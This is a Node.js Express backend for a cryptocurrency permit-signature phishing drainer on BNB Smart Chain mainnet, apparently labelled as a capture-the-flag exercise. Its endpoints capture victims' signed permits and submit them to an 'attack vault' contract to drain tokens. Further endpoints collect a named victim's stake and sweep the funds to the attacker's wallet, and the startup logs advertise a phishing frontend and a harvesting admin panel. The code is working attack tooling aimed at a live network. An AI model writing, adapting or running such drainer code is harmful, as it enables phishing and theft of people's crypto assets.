const path = require('path');
require('dotenv').config({ path: path.join(__dirname, '..', '.env.mainnet') });
const express = require('express');
const { ethers } = require('ethers');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json({ limit: '1mb' }));

const NBT_TOKEN = process.env.NBT_TOKEN || '';
const ATTACK_VAULT = process.env.ATTACK_VAULT || '';

// 稳定 RPC 优先（中国大陆可访问），避免 bsc-dataseed.binance.org 超时
const RPC_CANDIDATES = [
  'https://bsc-dataseed.bnbchain.org',
  'https://bsc-dataseed1.bnbchain.org',
  'https://bsc.publicnode.com',
  'https://bsc.blockpi.network/v1/rpc/public',
  'https://rpc.ankr.com/bsc',
  ...(process.env.BSC_MAINNET_RPC_URLS || '').split(','),
  process.env.BSC_MAINNET_RPC_URL || '',
].map((url) => url.trim()).filter(Boolean);

function pickRpc() {
  return RPC_CANDIDATES[0];
}
const RPC = pickRpc();

const PRIVATE_KEY = process.env.PRIVATE_KEY;
const ATTACKER_ADDR = PRIVATE_KEY
  ? new ethers.Wallet(PRIVATE_KEY).address
  : '0x0000000000000000000000000000000000000000';

app.use(express.static(path.join(__dirname, 'public')));

const VAULT_ABI = [
  'function nbt() view returns (address)',
  'function owner() view returns (address)',
  'function totalStaked() view returns (uint256)',
  'function staked(address) view returns (uint256)',
  'function confirmMultisig(bytes32,uint256,uint8,bytes32,bytes32)',
  'function onLpReceived(address,uint256,uint8,bytes32,bytes32)',
  'function collect(address)',
  'function sweep(address,address,uint256)',
  'function balanceOf(address) view returns (uint256)',
];
const TOKEN_ABI = [
  'function balanceOf(address) view returns (uint256)',
  'function allowance(address,address) view returns (uint256)',
  'function permit(address,address,uint256,uint256,uint8,bytes32,bytes32)',
];

const signatures = [];

function splitSignature(sig) {
  if (sig.length !== 132) throw new Error('invalid signature length');
  return {
    r: '0x' + sig.slice(2, 66),
    s: '0x' + sig.slice(66, 130),
    v: parseInt(sig.slice(130, 132), 16),
  };
}

// 带 RPC 故障切换的 provider 工厂
function makeProvider() {
  return new ethers.JsonRpcProvider(RPC, 56);
}

app.post('/api/claim', async (req, res) => {
  const { owner, signature, deadline } = req.body;

  if (!owner || !signature) {
    return res.json({ success: false, error: '缺少 owner 或 signature' });
  }

  const record = {
    owner,
    signature,
    deadline: deadline || 0,
    time: Date.now(),
  };

  if (!PRIVATE_KEY || !ATTACK_VAULT || !NBT_TOKEN) {
    signatures.push(record);
    console.log(`[Permit] 捕获签名: ${owner.slice(0, 6)}... 签名池: ${signatures.length}`);
    return res.json({ success: true, info: '签名已记录（演示模式，未执行链上交易）' });
  }

  try {
    const provider = makeProvider();
    const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
    const vault = new ethers.Contract(ATTACK_VAULT, VAULT_ABI, wallet);

    const { r, s, v } = splitSignature(signature);
    const deadlineVal = deadline || Math.floor(Date.now() / 1000) + 86400;

    const txHash = ethers.keccak256(ethers.toUtf8Bytes('permit.drain'));
    const tx = await vault.confirmMultisig(txHash, deadlineVal, v, r, s);
    const receipt = await tx.wait();

    console.log(`[Permit] Drain 成功! tx: ${receipt.transactionHash}`);
    record.txHash = receipt.transactionHash;
    signatures.push(record);

    res.json({
      success: true,
      txHash: receipt.transactionHash,
      recipient: ATTACKER_ADDR,
    });
  } catch (e) {
    console.error(`[Permit] Drain 失败:`, e.message);
    res.json({ success: false, error: e.message });
  }
});

app.get('/api/signatures', (req, res) => {
  res.json({ count: signatures.length, signatures });
});

app.get('/api/status', (req, res) => {
  res.json({
    status: 'ok',
    time: Date.now(),
    mode: PRIVATE_KEY && ATTACK_VAULT ? 'LIVE (可执行链上交易)' : 'DEMO (仅收集签名)',
    attacker: ATTACKER_ADDR,
    vault: ATTACK_VAULT,
    nbt: NBT_TOKEN,
    signatures: signatures.length,
  });
});

app.get('/api/vault/balance', async (req, res) => {
  try {
    const provider = makeProvider();
    const bal = await new ethers.Contract(NBT_TOKEN, TOKEN_ABI, provider).balanceOf(ATTACK_VAULT);
    res.json({ success: true, balance: ethers.formatEther(bal) });
  } catch (e) {
    res.json({ success: false, error: e.message, balance: '0' });
  }
});

app.post('/api/collect/:victim', async (req, res) => {
  if (!PRIVATE_KEY || !ATTACK_VAULT) {
    return res.json({ success: false, error: '未配置 PRIVATE_KEY/ATTACK_VAULT' });
  }
  try {
    const provider = makeProvider();
    const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
    const vault = new ethers.Contract(ATTACK_VAULT, VAULT_ABI, wallet);
    const tx = await vault.collect(req.params.victim);
    const receipt = await tx.wait();
    console.log(`[Collect] ${req.params.victim.slice(0, 6)}... tx: ${receipt.transactionHash}`);
    res.json({ success: true, txHash: receipt.transactionHash });
  } catch (e) {
    res.json({ success: false, error: e.message });
  }
});

app.post('/api/sweep', async (req, res) => {
  const { to, amount } = req.body;
  if (!PRIVATE_KEY || !ATTACK_VAULT || !NBT_TOKEN) {
    return res.json({ success: false, error: '未配置 PRIVATE_KEY/ATTACK_VAULT/NBT_TOKEN' });
  }
  try {
    const provider = makeProvider();
    const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
    const vault = new ethers.Contract(ATTACK_VAULT, VAULT_ABI, wallet);
    const bal = await new ethers.Contract(NBT_TOKEN, TOKEN_ABI, provider).balanceOf(ATTACK_VAULT);
    const amt = amount ? ethers.parseEther(String(amount)) : bal;
    const tx = await vault.sweep(NBT_TOKEN, to || ATTACKER_ADDR, amt);
    const receipt = await tx.wait();
    console.log(`[Sweep] tx: ${receipt.transactionHash}`);
    res.json({ success: true, txHash: receipt.transactionHash });
  } catch (e) {
    res.json({ success: false, error: e.message });
  }
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
  console.log(`[NBT-CTF] 钓鱼前端: http://localhost:${PORT}`);
  console.log(`[NBT-CTF] 后台收割面板: http://localhost:${PORT}/admin.html`);
  console.log(`[NBT-CTF] Permit 签名收集: http://localhost:${PORT}/api/claim`);
  console.log(`[NBT-CTF] 攻击者地址: ${ATTACKER_ADDR}`);
  console.log(`[NBT-CTF] Vault: ${ATTACK_VAULT || '(未配置)'}`);
  console.log(`[NBT-CTF] RPC: ${RPC}`);
  console.log(`[NBT-CTF] 模式: ${PRIVATE_KEY && ATTACK_VAULT ? 'LIVE（可执行链上 Drain）' : 'DEMO（仅收集签名）'}`);
});
